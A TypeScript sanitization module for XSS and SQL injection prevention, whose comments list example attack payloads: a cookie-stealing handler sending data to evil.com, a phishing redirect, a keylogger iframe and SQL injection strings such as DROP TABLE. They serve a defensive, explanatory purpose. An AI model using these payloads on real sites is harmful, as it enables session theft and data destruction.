/**
 * OWASP Security Utility: Input Sanitization and XSS Prevention
 * 
 * XSS (Cross-Site Scripting) Prevention:
 * XSS occurs when malicious scripts are injected into web applications through user input.
 * This sanitizer removes dangerous HTML/JavaScript that could execute in the browser.
 * 
 * SQL Injection Prevention:
 * SQL injection is prevented through Prisma ORM's parameterized queries.
 * Never concatenate user input directly into SQL queries.
 * 
 * Example Threats:
 * - Stored XSS: <img src=x onerror="alert('hacked')">
 * - Event Handler Injection: onload="fetch('https://evil.com/steal?data='+document.cookie)"
 * - Script Tag Injection: <script>document.location='https://phishing.site'</script>
 */

import sanitizeHtml from "sanitize-html";


/**
 * Allowed HTML tags for rich content (e.g., blog posts, comments)
 * Only includes safe tags that don't support event handlers
 */
const RICH_TEXT_CONFIG: sanitizeHtml.IOptions = {
  allowedTags: ["b", "i", "em", "strong", "a", "p", "br", "ul", "ol", "li", "blockquote", "h1", "h2", "h3"],
  allowedAttributes: {
    a: ["href", "title"],
  },
  allowedSchemes: ["http", "https", "mailto"],
  disallowedTagsMode: "discard" as const,
};

/**
 * Minimal configuration - only allow text, no HTML
 * Use this for user names, emails, titles, and other plain text fields
 */
const PLAIN_TEXT_CONFIG: sanitizeHtml.IOptions = {
  allowedTags: [],
  allowedAttributes: {},
  disallowedTagsMode: "discard" as const,
};

/**
 * Sanitize plain text input (removes ALL HTML)
 * Use for: usernames, names, titles, emails, descriptions
 * 
 * @param input - Raw user input
 * @returns Clean text without any HTML
 * 
 * @example
 * // Before: <img src=x onerror="alert('xss')">
 * // After: ""
 * 
 * @example
 * // Before: "John O'Reilly"
 * // After: "John O'Reilly"
 */
export function sanitizeText(input: string): string {
  if (typeof input !== "string") {
    return "";
  }
  return sanitizeHtml(input.trim(), PLAIN_TEXT_CONFIG);
}

/**
 * Sanitize rich text input (allows safe HTML tags)
 * Use for: blog posts, comments with formatting, descriptions
 * 
 * @param input - Raw user input with potential HTML
 * @returns Cleaned HTML with only safe tags and attributes
 * 
 * @example
 * // Before: '<p>Check this: <a href="javascript:alert()">click</a></p>'
 * // After: '<p>Check this: <a>click</a></p>'
 * 
 * @example
 * // Before: '<p>Safe <b>bold</b> text</p><script>alert("xss")</script>'
 * // After: '<p>Safe <b>bold</b> text</p>'
 */
export function sanitizeHtmlContent(input: string): string {
  if (typeof input !== "string") {
    return "";
  }
  return sanitizeHtml(input.trim(), RICH_TEXT_CONFIG);
}

/**
 * Sanitize email input
 * Removes any non-email characters and potential injection attempts
 * 
 * @param input - Raw email input
 * @returns Cleaned email string
 * 
 * @example
 * // Before: 'user@example.com<script>alert("xss")</script>'
 * // After: 'user@example.com'
 */
export function sanitizeEmail(input: string): string {
  if (typeof input !== "string") {
    return "";
  }
  // Remove any HTML-like content first
  const cleaned = sanitizeText(input);
  // Basic email validation pattern (RFC 5322 simplified)
  const emailPattern = /[^\w@.\-+]/g;
  return cleaned.replace(emailPattern, "").toLowerCase();
}

/**
 * Sanitize URL input
 * Validates and cleans URLs to prevent javascript: protocol injection
 * 
 * @param input - Raw URL input
 * @returns Cleaned URL or empty string if invalid
 * 
 * @example
 * // Before: 'javascript:alert("xss")'
 * // After: ''
 * 
 * @example
 * // Before: 'https://example.com/page<img src=x onerror=alert()>'
 * // After: 'https://example.com/page'
 */
export function sanitizeUrl(input: string): string {
  if (typeof input !== "string") {
    return "";
  }
  
  try {
    // Remove any HTML tags first
    const cleaned = sanitizeText(input);
    
    // Block dangerous protocols
    if (cleaned.match(/^(javascript|data|vbscript):/i)) {
      return "";
    }
    
    // Try to parse as URL
    const url = new URL(cleaned, "https://example.com");
    
    // Only allow http and https
    if (!["http:", "https:", "mailto:"].includes(url.protocol)) {
      return "";
    }
    
    return url.toString();
  } catch {
    // Invalid URL - return empty string
    return "";
  }
}

/**
 * Sanitize numeric input
 * Ensures input is a valid number, preventing injection through type confusion
 * 
 * @param input - Raw numeric input
 * @returns Parsed number or 0 if invalid
 * 
 * @example
 * // Before: '123<script>alert("xss")</script>'
 * // After: 123
 */
export function sanitizeNumber(input: any): number {
  const num = parseFloat(String(input));
  return isNaN(num) ? 0 : num;
}

/**
 * Sanitize object containing user input
 * Recursively sanitizes all string values in an object
 * Use this for form data before storing in database
 * 
 * @param obj - Object with potentially unsafe values
 * @param textFields - Array of field names to sanitize as plain text
 * @param richFields - Array of field names to sanitize as rich HTML
 * @returns New object with sanitized values
 * 
 * @example
 * const rawData = {
 *   name: '<img src=x onerror="alert()">John',
 *   email: 'user@example.com<script>',
 *   bio: '<p>Developer</p><script>alert("xss")</script>'
 * };
 * 
 * const clean = sanitizeObject(rawData, ['name', 'email'], ['bio']);
 * // Result:
 * // {
 * //   name: 'John',
 * //   email: 'user@example.com',
 * //   bio: '<p>Developer</p>'
 * // }
 */
export function sanitizeObject<T extends Record<string, any>>(
  obj: T,
  textFields: (keyof T)[] = [],
  richFields: (keyof T)[] = []
): Partial<T> {
  const sanitized: Partial<T> = {};

  for (const key in obj) {
    if (Object.prototype.hasOwnProperty.call(obj, key)) {
      const value = obj[key];
      const keyAsKeyofT = key as keyof T;

      if (textFields.includes(keyAsKeyofT) && typeof value === "string") {
        // Sanitize as plain text
        (sanitized as any)[key] = sanitizeText(value);
      } else if (richFields.includes(keyAsKeyofT) && typeof value === "string") {
        // Sanitize as rich HTML
        (sanitized as any)[key] = sanitizeHtmlContent(value);
      } else if (typeof value === "string") {
        // Default: treat as plain text
        (sanitized as any)[key] = sanitizeText(value);
      } else {
        // Non-string values pass through unchanged
        (sanitized as any)[key] = value;
      }
    }
  }

  return sanitized;
}

/**
 * BEFORE/AFTER EXAMPLES - Common Attack Vectors
 * 
 * ========== XSS Attack Examples ==========
 * 
 * 1. IMAGE TAG WITH EVENT HANDLER (Stored XSS)
 * BEFORE: <img src=x onerror="fetch('https://evil.com/steal?data='+document.cookie)">
 * AFTER:  (removed completely by sanitizer)
 * IMPACT: Without sanitization, attacker steals session cookies
 * 
 * 2. SCRIPT TAG INJECTION
 * BEFORE: Hello<script>window.location='https://phishing.site'</script>
 * AFTER:  Hello
 * IMPACT: Without sanitization, users redirected to phishing site
 * 
 * 3. EVENT HANDLER IN LINK
 * BEFORE: <a href="javascript:alert('xss')">Click me</a>
 * AFTER:  <a>Click me</a> (href removed, javascript: protocol blocked)
 * IMPACT: Without sanitization, malicious code executes on click
 * 
 * 4. SVG WITH EVENT HANDLER
 * BEFORE: <svg onload="fetch('/api/admin?action=delete&id=1')">
 * AFTER:  (removed completely)
 * IMPACT: Without sanitization, arbitrary API calls executed with user's privileges
 * 
 * 5. IFRAME INJECTION
 * BEFORE: <iframe src="https://evil.com/keylogger.html"></iframe>
 * AFTER:  (removed completely)
 * IMPACT: Without sanitization, keylogger iframes capture user input
 * 
 * 6. STYLE-BASED XSS
 * BEFORE: <div style="background:url(javascript:alert('xss'))">Content</div>
 * AFTER:  <div>Content</div>
 * IMPACT: Without sanitization, JavaScript executes through CSS
 * 
 * ========== SQL Injection Prevention (Prisma ORM) ==========
 * 
 * VULNERABLE CODE:
 * const user = await prisma.$queryRaw`SELECT * FROM User WHERE email = '${email}'`;
 * 
 * REASON: String interpolation concatenates user input directly into query
 * ATTACK: email = "' OR '1'='1" bypasses authentication
 * 
 * SAFE CODE (Prisma):
 * const user = await prisma.user.findUnique({ where: { email } });
 * 
 * REASON: Prisma ORM uses parameterized queries, user input treated as data, not code
 * 
 * ========== Combined Attack Example ==========
 * 
 * Malicious User Input:
 * name: "Robert<img src=x onerror='fetch(/api/admin?delete=1)'>"
 * email: "user@example.com'; DROP TABLE users; --"
 * 
 * WITH SANITIZATION:
 * After sanitizeObject():
 * name: "Robert"
 * email: "user@example.com"
 * + Prisma prevents SQL injection
 * Result: SAFE ✓
 * 
 * WITHOUT SANITIZATION:
 * Database stores: "Robert<img src=x onerror='...'>"
 * When displayed: XSS executes in every user's browser ✗
 * SQL could inject if using raw queries ✗
 * Result: COMPROMISED ✗
 */
